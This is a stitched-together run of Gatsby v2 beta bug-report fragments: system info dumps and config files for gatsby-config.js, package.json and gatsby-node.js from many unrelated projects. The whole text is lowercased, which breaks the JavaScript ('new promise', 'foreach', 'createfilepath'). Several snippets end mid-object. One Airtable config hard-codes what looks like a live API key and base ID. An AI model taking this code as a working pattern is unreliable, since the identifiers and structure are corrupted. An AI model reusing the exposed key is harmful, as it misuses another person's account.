-e %husky_git_params%" } }, "lint-staged": { "*.{js,jsx}": [ "eslint --fix", "git add" ], "*.{json,css}": [ "prettier --write", "git add" ] }, "devdependencies": { "@commitlint/cli": "^6.2.0", "@commitlint/config-conventional": "^6.1.3", "@commitlint/prompt-cli": "^6.1.3", "babel-eslint": "^8.2.5", "eslint": "^4.19.1", "eslint-config-airbnb": "^16.1.0", "eslint-config-prettier": "^2.10.0", "eslint-plugin-graphql": "^2.1.1", "eslint-plugin-import": "^2.14.0", "eslint-plugin-jsx-a11y": "^6.0.3", "eslint-plugin-prettier": "^2.6.0", "eslint-plugin-react": "^7.11.0", "gatsby-plugin-remove-trailing-slashes": "^1.0.9", "husky": "^1.0.0-rc.9", "lint-staged": "^7.2.2", "prettier": "^1.14.2" }
`gatsby-node.js`:
const path = require(`path`);
const { createfilepath } = require(`gatsby-source-filesystem`); exports.oncreatenode = ({ node, getnode, actions }) => { const { createnodefield } = actions; if (node.internal.type === 'markdownremark') { const slug = createfilepath({ node, getnode, basepath: 'pages' }); createnodefield({ node, name: 'slug', value: slug, }); }
}; exports.createpages = ({ graphql, actions }) => { const { createpage } = actions; return new promise((resolve, reject) => { graphql( ` { allmarkdownremark { edges { node { fields { slug } } } } } ` ).then(result => { result.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: `/blog${node.fields.slug}`, component: path.resolve('./src/templates/blog-post.js'), context: { slug: node.fields.slug, }, }); }); resolve(); }); });
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.4 cpu: x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 2.5.0 - /usr/local/bin/fish binaries: node: 10.8.0 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.2.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.1 safari: 11.1 npmpackages: gatsby: next => 2.0.0-beta.99 gatsby-mdx: 0.0.8 => 0.0.8 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-styled-components: next => 3.0.0-beta.3 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: next => 2.1.1-beta.6 npmglobalpackages: gatsby-cli: 2.0.0-beta.13 ### file contents `gatsby-config.js`:
module.exports = { sitemetadata: { title: 'geddski', }, plugins: [ 'gatsby-plugin-react-helmet', 'gatsby-plugin-styled-components', { resolve: `gatsby-source-filesystem`, options: { name: `src`, path: `${__dirname}/src/`, }, }, { resolve: 'gatsby-mdx', options: { decks: [] }, }, ],
``` `package.json`:
{ "name": "gatsby-starter-default", "description": "gatsby default starter", "version": "1.0.0", "author": "dave geddes", "private": true, "dependencies": { "@mdx-js/mdx": "^0.15.0", "@mdx-js/tag": "^0.15.0", "babel-plugin-styled-components": "^1.5.1", "brace": "^0.11.1", "common-tags": "^1.8.0", "gatsby": "next", "gatsby-mdx": "0.0.8", "gatsby-plugin-react-helmet": "next", "gatsby-plugin-styled-components": "next", "gatsby-source-filesystem": "next", "gatsby-transformer-remark": "next", "react": "^16.4.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0", "react-safe": "^1.1.1", "styled-components": "^3.4.0" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \'**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "prettier": "^1.13.7" }, "repository": { "type": "git", "url": " " }
} ``` `gatsby-node.js`:
const path = require(`path`) const { createfilepath } = require(`gatsby-source-filesystem`) // add fields to the nodes
exports.oncreatenode = ({ node, getnode, actions }) => { const { createnodefield } = actions if (node.internal.type === `mdx`) { const slug = createfilepath({ node, getnode, basepath: `pages` }) createnodefield({ node, name: `slug`, value: slug, }) }
} exports.createpages = ({ graphql, actions }) => { const { createpage } = actions return new promise((resolve, reject) => { resolve( graphql( ` { allmdx { edges { node { fileabsolutepath filenode { name } fields { slug } } } } } ` ).then(result => { if (result.errors) { console.log(result.errors) reject(result.errors) } // create blog posts pages
result.data.allmdx.edges.foreach(({ node }) => { let slug = '' if (node.fields && node.fields.slug) { slug = node.fields.slug } createpage({ path: `/post/${node.filenode.name}`, component: node.fileabsolutepath, context: { slug: slug, }, }) }) }) ) })
} ``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
(if relevant) system:
os: windows 10
cpu: x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz
yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd
npm: 5.6.0 - c:\\program files\ odejs\ pm.cmd
edge: 41.16299.248.0
npmpackages:
gatsby: ^2.0.0-beta.98 => 2.0.0-beta.98
gatsby-image: ^1.0.55 => 1.0.55
gatsby-link: ^2.0.0-beta.12 => 2.0.0-beta.17
gatsby-plugin-canonical-urls: ^1.0.18 => 1.0.18
gatsby-plugin-google-analytics: ^2.0.0-beta.4 => 2.0.0-beta.4
gatsby-plugin-google-tagmanager: ^1.0.19 => 1.0.19
gatsby-plugin-i18n: ^0.4.2 => 0.4.2
gatsby-plugin-manifest: ^2.0.2-beta.4 => 2.0.2-beta.4
gatsby-plugin-offline: ^2.0.0-beta.9 => 2.0.0-beta.9
gatsby-plugin-purify-css: ^2.2.1 => 2.2.1
gatsby-plugin-react-helmet: ^3.0.0-beta.4 => 3.0.0-beta.4
gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0
gatsby-plugin-sharp: ^2.0.0-beta.7 => 2.0.0-beta.7
gatsby-plugin-sitemap: ^2.0.0-beta.3 => 2.0.0-beta.3
gatsby-source-contentful: ^2.0.1-beta.15 => 2.0.1-beta.15
gatsby-transformer-remark: ^2.1.1-beta.6 => 2.1.1-beta.6
gatsby-transformer-sharp: ^2.1.1-beta.6 => 2.1.1-beta.6
gatsby info --clipboard system: os: linux 4.17 fedora 28 (workstation edition) 28 (workstation edition) cpu: x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 4.4.23 - /bin/bash binaries: node: 10.7.0 - /usr/bin/node yarn: 1.9.4 - /usr/bin/yarn npm: 6.1.0 - /usr/bin/npm browsers: chrome: 68.0.3440.75 firefox: 61.0.1 npmpackages: gatsby: next => 2.0.0-beta.97 gatsby-1-config-css-modules: next => 1.0.10-13 gatsby-image: next => 2.0.0-beta.7 gatsby-plugin-google-fonts: 0.0.4 => 0.0.4 gatsby-plugin-mailchimp: 2.2.3 => 2.2.3 gatsby-plugin-netlify: ^2.0.0-beta.6 => 2.0.0-beta.6 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sass: next => 2.0.0-beta.10 gatsby-plugin-sharp: next => 2.0.0-beta.7 gatsby-plugin-styled-components: next => 3.0.0-beta.3 gatsby-plugin-typescript: next => 2.0.0-beta.9 gatsby-source-contentful: next => 2.0.1-beta.15 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-sharp: next => 2.1.1-beta.6 npmglobalpackages: gatsby-cli: 1.1.58 gatsby: 2.0.0-beta.54 ``` ### file contents (if changed) `gatsby-config.js`: ```
let contentfulconfig, mailchimpconfig; try { contentfulconfig = require('./config/contentful.json');
} catch (_) { contentfulconfig = { spaceid: process.env.contentful_space_id, accesstoken: process.env.contentful_delivery_token, }
} try { mailchimpconfig = require('./config/mailchimp.json')
} catch (_) { mailchimpconfig = { endpoint: process.env.mailchimp_endpoint }
} module.exports = { plugins: [ 'gatsby-plugin-react-helmet', `gatsby-plugin-typescript`, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, `gatsby-plugin-sass`, `gatsby-plugin-styled-components`, { resolve: `gatsby-plugin-google-fonts`, options: { fonts: [ `roboto:300,300i,400,400i,500,500i,600,600i`, ], }, }, { resolve: `gatsby-source-contentful`, options: contentfulconfig, }, { resolve: 'gatsby-plugin-mailchimp', options: mailchimpconfig, }, `gatsby-plugin-netlify`, // make sure to keep it last in the array ],
}; ``` `package.json`: ```
{ "name": "", "description": "", "version": "1.0.0", "author": "", "dependencies": { "@blueprintjs/core": "^3.0.1", "autoprefixer": "^9.0.1", "babel-plugin-styled-components": "^1.5.1", "extract-text-webpack-plugin": "^3.0.2", "gatsby": "next", "gatsby-1-config-css-modules": "next", "gatsby-image": "next", "gatsby-plugin-google-fonts": "0.0.4", "gatsby-plugin-mailchimp": "2.2.3", "gatsby-plugin-netlify": "^2.0.0-beta.6", "gatsby-plugin-react-helmet": "next", "gatsby-plugin-sass": "next", "gatsby-plugin-sharp": "next", "gatsby-plugin-styled-components": "next", "gatsby-plugin-typescript": "next", "gatsby-source-contentful": "next", "gatsby-source-filesystem": "next", "gatsby-transformer-sharp": "next", "grid-styled": "^5.0.2", "install": "^0.12.1", "lodash": "^4.17.10", "lodash.debounce": "^4.0.8", "moment": "^2.22.2", "node-sass": "^4.9.2", "npm": "^6.3.0", "prismjs": "^1.15.0", "react": "^16.4.1", "react-accessible-accordion": "^2.4.4", "react-custom-scrollbars": "^4.2.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0", "react-player": "^1.6.4", "react-prism": "^4.3.2", "react-redux": "^5.0.7", "react-share": "^2.2.0", "react-slick": "^0.23.1", "remark": "^9.0.0", "remark-react": "^4.0.3", "slick-carousel": "^1.8.1", "styled-components": "^3.3.3", "tinycolor2": "^1.4.1" }, "keywords": [ "static site", "cards", "smart cards", "blog" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \'**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "@types/grid-styled": "^4.2.0", "@types/lodash": "^4.14.115", "@types/moment": "^2.13.0", "@types/node": "^10.5.5", "@types/prismjs": "^1.9.0", "@types/prop-types": "^15.5.4", "@types/reach__router": "^1.0.0", "@types/react": "^16.4.7", "@types/react-dom": "^16.0.6", "@types/react-helmet": "^5.0.6", "@types/react-redux": "^6.0.5", "@types/react-share": "^2.1.1", "@types/react-transition-group": "^2.0.13", "@types/tinycolor2": "^1.4.1", "prettier": "^1.13.7", "redux-devtools-extension": "^2.13.5" }, "repository": { "type": "git", "url": "" }
} ``` `gatsby-node.js`: ```
const _ = require('lodash');
const promise = require('bluebird');
const path = require('path');
const {createfilepath} = require(`gatsby-source-filesystem`);
const {createremotefilenode} = require(`gatsby-source-filesystem`); const gettags = (edges) => { const tags = []; _.each(edges, edge => { if (_.get(edge, "node.tags")) { for (let i = 0; i < edge.node.tags.length; i++) { tags.push(edge.node.tags[i]); } } }); return tags;
}; const getcategories = (edges) => { const categories = []; _.each(edges, edge => { if (_.get(edge, "node.categories")) { for (let i = 0; i < edge.node.categories.length; i++) { categories.push(edge.node.categories[i]); } } }); return categories;
}; exports.createpages = ({graphql, actions}) => { const {createpage} = actions; return new promise((resolve, reject) => { const posttemplate = path.resolve(\'./src/templates/post/index.tsx\'); const tagtemplate = path.resolve("./src/templates/tag/index.tsx"); const categorytemplate = path.resolve("./src/templates/category/index.tsx"); resolve(graphql(` { allcontentfulpost(sort: {fields: [createdat], order: desc}) { edges { node { id slug tags { id slug title } categories { id slug title } createdat updatedat } } } } `).then(result => { if (result.errors) { console.error(result.errors); reject(result.errors); } const edges = result.data.allcontentfulpost.edges; const tags = gettags(edges); const categories = getcategories(edges); // create posts and pages
_.each(edges, (edge, index) => { const slug = edge.node.slug; const previous = index === edges.length - 1 ? null : edges[index + 1].node; const next = index === 0 ? null : edges[index - 1].node; // create posts pages createpage({ path: `/posts/${slug}/`, component: posttemplate, context: { slug: slug, previous, next, }, }); }); // make tag pages _.uniq(tags).foreach(tag => { createpage({ path: `/tags/${tag.slug}/`, component: tagtemplate, context: { slug: tag.slug }, }) }); // make category pages _.uniqby(categories, 'id').foreach(category => { createpage({ path: `/categories/${category.slug}/`, component: categorytemplate, context: { slug: category.slug }, }) }); })); });
``` `gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a no console errors shown.
i set up a repro on netlify with the latest `@next` packages to reproduce: ``` "gatsby": "^2.0.0-beta.98", "gatsby-plugin-manifest": "^2.0.2-beta.5", "gatsby-plugin-offline": "^2.0.0-beta.9", "gatsby-plugin-react-helmet": "^3.0.0-beta.4",
``` (fyi `gatsby info --clipboard` failed on my computer (windows 10) with an unhanded rejection...) <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
<!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i5-3230m cpu @ 2.60ghz shell: 5.2 - /bin/zsh binaries: node: 10.6.0 - ~/.nvm/versions/node/v10.6.0/bin/node yarn: 1.7.0 - ~/.nvm/versions/node/v10.6.0/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v10.6.0/bin/npm npmpackages: gatsby: next => 2.0.0-beta.86 gatsby-image: next => 2.0.0-beta.7 gatsby-plugin-glamor: next => 2.0.0-beta.3 gatsby-plugin-netlify: next => 2.0.0-beta.6 gatsby-plugin-sharp: next => 2.0.0-beta.7 gatsby-plugin-typography: next => 2.2.0-beta.3 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-sharp: next => 2.1.1-beta.6 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.6 binaries: node: 10.7.0 - /usr/local/bin/node yarn: 1.9.2 - /usr/local/bin/yarn npm: 6.2.0 - /usr/local/bin/npm npmpackages: gatsby: next => 2.0.0-beta.76 gatsby-plugin-manifest: next => 2.0.2-beta.4 gatsby-plugin-offline: next => 2.0.0-beta.9 gatsby-plugin-postcss: ^1.0.0 => 1.0.0 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-3635qm cpu @ 2.40ghz shell: 5.3 - /bin/zsh binaries: node: 10.7.0 - ~/.nvm/versions/node/v10.7.0/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v10.7.0/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0 safari: 11.1.1 npmpackages: gatsby: 2.0.0-beta.69 => 2.0.0-beta.69 gatsby-plugin-offline: 2.0.0-beta.6 => 2.0.0-beta.6
``` ### file contents (if changed) `gatsby-config.js`: ```module.exports = { sitemetadata: { title: "gatsby redux", }, // in your gatsby-config.js plugins: ["gatsby-plugin-offline"],
`package.json`: ```{ "name": "gatsby-example-redux", "private": true, "description": "gatsby example site that shows use of redux.", "version": "1.0.0", "author": "scotty eckenthal <scott.eckenthal@gmail.com>", "engines": { "node": "10.7.0", "yarn": "1.7.0" }, "dependencies": { "gatsby": "2.0.0-beta.69", "gatsby-plugin-offline": "2.0.0-beta.6", "react": "^16.4.0", "react-dom": "^16.4.0", "react-redux": "5.0.5", "redux": "3.6.0" }, "keywords": [ "gatsby" ], "license": "mit", "main": "n/a", "scripts": { "develop": "gatsby develop", "build": "gatsby build", "serve": "gatsby serve", "heroku-prebuild": "rm -rf .cache && rm -rf public", "heroku-postbuild": "gatsby build" }
`gatsby-node.js`: n/a
`gatsby-browser.js`: ```import react from 'react'
import { router } from 'react-router-dom'
import { provider } from 'react-redux' import createstore from './src/state/createstore' const store = createstore() export const replaceroutercomponent = ({ history }) => { const connectedrouterwrapper = ({ children }) => ( <provider store={store}> <router history={history}>{children}</router> </provider> ) return connectedrouterwrapper
`gatsby-ssr.js`: ```import react from 'react'
import { provider } from 'react-redux'
import { rendertostring } from 'react-dom/server' import createstore from './src/state/createstore' export const replacerenderer = ({ bodycomponent, replacebodyhtmlstring }) => { const store = createstore() const connectedbody = () => ( <provider store={store}> {bodycomponent} </provider> ) replacebodyhtmlstring(rendertostring(<connectedbody/>))
gatsby@2.0.0-beta.69
gatsby-link@2.0.0-beta.6
i'm running v2, but this happens in both v1 and v2.
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 68.0.3440.84 firefox: 61.0.1 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.69 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-react-docgen: next => 2.1.1-beta.4
### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
<!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ```bash system: os: linux 4.4 ubuntu 18.04 lts (bionic beaver) cpu: x64 intel(r) core(tm) i7-3687u cpu @ 2.10ghz shell: 4.4.19 - /bin/bash binaries: node: 10.6.0 - ~/n/bin/node yarn: 1.9.4 - ~/n/bin/yarn npm: 6.3.0 - ~/n/bin/npm npmglobalpackages: gatsby-cli: 2.0.0-beta.7
``` ### file contents (if changed) `gatsby-config.js`: ```node
module.exports = { sitemetadata: { title: `blog app`, sitestories: { title: `stories of our time`, }, siteevents: { title: `pandas eating lots`, }, siteabout: { title: `about css modules`, }, }, plugins: [ { resolve: 'gatsby-source-airtable', options: { apikey: 'keyt4kamtxofjjgqh', baseid: 'app7dd4jj1iwhoghs', tablename: 'cms', tableview: 'published', queryname: '' } }, { resolve: `gatsby-source-filesystem`, options: { name: `src`, path: `${__dirname}/src/`, }, }, `gatsby-transformer-remark`, `gatsby-plugin-emotion`, `gatsby-plugin-react-helmet`, { resolve: `gatsby-plugin-typography`, options: {pathtoconfigmodule: `src/utils/typography.js`}, }, ],
`package.json`: ```json
{ "name": "blog", "description": "blog application", "version": "0.1.0", "dependencies": { "emotion": "^9.2.6", "emotion-server": "^9.2.6", "gatsby": "^2.0.0-beta.67", "gatsby-plugin-emotion": "^2.0.0-beta.3", "gatsby-plugin-react-helmet": "next", "gatsby-plugin-typography": "^2.2.0-beta.3", "gatsby-source-filesystem": "^2.0.1-beta.10", "gatsby-transformer-remark": "^2.1.1-beta.5", "react": "^16.4.1", "react-dom": "^16.4.1", "react-emotion": "^9.2.6", "react-helmet": "^5.2.0", "react-typography": "^0.16.13", "remark-html": "^7.0.0", "remark-react": "^4.0.3", "typography": "^0.16.17", "typography-theme-lincoln": "^0.15.11", "unified": "^7.0.0" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "develop": "gatsby develop", "format": "prettier --write \'src/**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1", "build": "gatsby build" }, "devdependencies": { "prettier": "^1.13.7" }, "repository": { "type": "git", "url": " " }
``` `gatsby-node.js`: ```node
const path = require(`path`)
const { createfilepath } = require(`gatsby-source-filesystem`) exports.oncreatenode = ({ node, getnode, actions }) => { const { createnodefield } = actions if (node.internal.type === `markdownremark`) { const slug = createfilepath({ node, getnode, basepath: `contents` }) createnodefield({ node, name: `slug`, value: slug, }) }
} exports.createpages = ({ graphql, actions }) => { const { createpage } = actions return new promise((resolve, reject) => { graphql(` { allairtable { edges { node { slug } } } allmarkdownremark { edges { node { fields { slug } } } } } `).then(result => { result.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: `/events${node.fields.slug}`, component: path.resolve(`./src/templates/blog-post.js`), context: { // data passed to context is available // in page queries as graphql variables
slug: node.fields.slug, }, }) }) result.data.allairtable.edges.foreach(({ node }) => { createpage({ path: `/stories${node.slug}`, component: path.resolve(`./src/templates/air-post.js`), context: { slug: node.slug } }) }) resolve() }) })
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a `air-post.js`: ```node
import react from "react"
import unified from 'unified'
import markdown from 'remark-parse'
import html from 'remark-html'
import { graphql } from "gatsby"
import layout from "../components/layout-stories" export default ({ data }) => { // console.log(data) return ( <layout> <div> <h1>{data.airtable.title}</h1> <h5>{data.airtable.published_date}</h5> <h5>written by {data.airtable.author}</h5> <img src={data.airtable.cover[0].url} style={{ display: \'block\', marginbottom: \'1rem\', margintop: \'1rem\', width: \'100%\', height: \'auto\' }} alt="" /> <div dangerouslysetinnerhtml={{ __html: unified() .use(markdown) .use(html) .processsync(data.airtable.story) }} /> </div> </layout> )
} export const query = graphql` query($slug: string!) { airtable(slug: { eq: $slug }) { id slug title cover { id url } story status published_date(formatstring: "dd mmmm, yyyy") author } }
``` os: macos sierra 10.12.2 cpu: x64 intel(r) core(tm) i7-3770s cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 67.0.3396.99 firefox: 61.0.1 safari: 10.0.2 npmpackages: gatsby: ^1.9.277 => 1.9.277 gatsby-image: ^1.0.55 => 1.0.55 gatsby-link: ^1.6.46 => 1.6.46 gatsby-plugin-catch-links: ^1.0.24 => 1.0.24 gatsby-plugin-feed: ^1.3.25 => 1.3.25 gatsby-plugin-google-analytics: ^1.0.31 => 1.0.31 gatsby-plugin-manifest: ^1.0.27 => 1.0.27 gatsby-plugin-nprogress: ^1.0.11 => 1.0.14 gatsby-plugin-offline: ^1.0.18 => 1.0.18 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 gatsby-plugin-sharp: ^1.6.48 => 1.6.48 gatsby-plugin-sitemap: ^1.2.25 => 1.2.25 gatsby-plugin-twitter: ^1.0.16 => 1.0.20 gatsby-plugin-typography: ^1.7.19 => 1.7.19 gatsby-remark-autolink-headers: ^1.4.19 => 1.4.19 gatsby-remark-copy-linked-files: ^1.5.37 => 1.5.37 gatsby-remark-images: ^1.5.67 => 1.5.67 gatsby-remark-prismjs: ^1.2.24 => 1.2.24 gatsby-remark-responsive-iframe: ^1.4.20 => 1.4.20 gatsby-source-filesystem: ^1.5.39 => 1.5.39 gatsby-transformer-remark: ^1.7.44 => 1.7.44 gatsby-transformer-sharp: ^1.6.27 => 1.6.27
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.9.2 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 68.0.3440.84 firefox: 61.0.1 safari: 11.1.2 npmpackages: gatsby: ^2.0.0-beta.64 => 2.0.0-beta.67 gatsby-plugin-catch-links: ^2.0.2-beta.5 => 2.0.2-beta.5 gatsby-plugin-feed: next => 2.0.0-beta.4 gatsby-plugin-glamor: next => 2.0.0-beta.3 gatsby-plugin-google-analytics: next => 2.0.0-beta.3 gatsby-plugin-manifest: next => 2.0.2-beta.3 gatsby-plugin-netlify: next => 2.0.0-beta.5 gatsby-plugin-nprogress: next => 2.0.0-beta.4 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sharp: next => 2.0.0-beta.7 gatsby-plugin-twitter: next => 2.0.0-beta.3 gatsby-remark-autolink-headers: next => 2.0.0-beta.5 gatsby-remark-code-repls: next => 2.0.0-beta.4 gatsby-remark-copy-linked-files: next => 2.0.0-beta.3 gatsby-remark-embed-snippet: next => 3.0.0-beta.3 gatsby-remark-images: next => 2.0.1-beta.9 gatsby-remark-prismjs: next => 3.0.0-beta.5 gatsby-remark-responsive-iframe: next => 2.0.0-beta.3 gatsby-remark-smartypants: next => 2.0.0-beta.3 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: next => 2.1.1-beta.5 gatsby-transformer-sharp: next => 2.1.1-beta.6 ``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.1.0 - ~/.nvm/versions/node/v10.1.0/bin/node yarn: 1.9.2 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v10.1.0/bin/npm browsers: chrome: 68.0.3440.84 firefox: 60.0.2 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.66 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sharp: next => 2.0.0-beta.7 gatsby-remark-images: next => 2.0.1-beta.9 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: next => 2.1.1-beta.5 ```
(i'm using wsl on windows 10) system:
os: linux 4.4 ubuntu 16.04.4 lts (xenial xerus)
cpu: x64 intel(r) core(tm) i5-2400 cpu @ 3.10ghz
shell: 4.3.48 - /bin/bash
node: 8.11.3 - /usr/bin/node
yarn: 1.7.0 - /usr/bin/yarn
npm: 6.2.0 - /usr/bin/npm
npmpackages:
gatsby: ^2.0.0-beta.64 => 2.0.0-beta.64
gatsby-plugin-netlify: ^2.0.0-beta.4 => 2.0.0-beta.4
gatsby-plugin-react-helmet: next => 3.0.0-beta.4
npmglobalpackages:
gatsby-cli: 1.1.58
gatsby: 1.9.273 ### file contents (if changed) `gatsby-config.js`: ```javascript
const catpicture = '/static/cat.jpg' module.exports = { sitemetadata: { title: 'gatsby default starter', }, plugins: [ 'gatsby-plugin-react-helmet', { resolve: 'gatsby-plugin-netlify', options: { allpageheaders: [`link: <${catpicture}>; rel=preload; as=image;`], }, }, ],
``` `package.json`: ```javascript
{ "name": "gatsby-netlify-bug-demo", "description": "demo of problem with gatsby-plugin-netlify", "version": "1.0.0", "author": "andrew bain", "dependencies": { "gatsby": "^2.0.0-beta.64", "gatsby-plugin-netlify": "^2.0.0-beta.4", "gatsby-plugin-react-helmet": "next", "react": "^16.4.1", "react-dom": "^16.4.1", "react-helmet": "^5.2.0" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \'**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "prettier": "^1.13.7" }, "repository": { "type": "git", "url": " " }
``` `gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: windows 10 cpu: x64 intel(r) core(tm) i5 cpu m 560 @ 2.67ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.1.0 - c:\\program files\ odejs\ pm.cmd ### file contents (if changed) `gatsby-config.js`: ```
const { node_env, url: netlify_site_url = '<url>', deploy_prime_url: netlify_deploy_url = netlify_site_url, context: netlify_env = node_env
} = process.env;
const isnetlifyproduction = netlify_env === 'production';
const siteurl = isnetlifyproduction ? netlify_site_url : netlify_deploy_url; module.exports = { sitemetadata: { siteurl }, plugins: [ { resolve: 'gatsby-plugin-google-analytics', options: { trackingid: '<id>', // puts tracking script in the head instead of the body head: false, // setting this parameter is optional anonymize: false, // avoids sending pageview hits from custom paths exclude: ['/preview/**'] } }, 'gatsby-plugin-react-helmet', { resolve: 'gatsby-plugin-manifest', options: { name: '<name>', short_name: '<short_name>', description: '<description>', dir: 'ltr', lang: 'en-us', start_url: '/', display: 'standalone', theme_color: '#000', background_color: '#fff', orientation: 'portrait-primary', icon: 'src/favicon.png' } }, 'gatsby-plugin-offline', 'gatsby-plugin-sitemap', { resolve: 'gatsby-plugin-robots-txt', options: { resolveenv: () => netlify_env, env: { production: { policy: [{ useragent: '*', disallow: ['/'] }] }, 'branch-deploy': { policy: [{ useragent: '*', disallow: ['/'] }], sitemap: null, host: null }, 'deploy-preview': { policy: [{ useragent: '*', disallow: ['/'] }], sitemap: null, host: null } } } }, 'gatsby-plugin-sass', { resolve: 'gatsby-plugin-emotion', options: { // any babel-plugin-emotion options } }, { resolve: 'gatsby-source-filesystem', options: { name: 'blog', path: `${__dirname}/src/blog/` } }, { resolve: 'gatsby-source-filesystem', options: { name: 'data', path: `${__dirname}/src/data/` } }, 'gatsby-transformer-sharp', 'gatsby-plugin-sharp', { resolve: 'gatsby-transformer-remark', options: { plugins: [ { resolve: 'gatsby-remark-images', options: { // it's important to specify the maxwidth (in pixels) of // the content container as this plugin uses this as the // base for generating different widths of each image
maxwidth: 960 } }, { resolve: 'gatsby-remark-copy-linked-files', options: { destinationdir: 'static' } } ] } }, 'gatsby-plugin-netlify' ]
``` `package.json`: ```
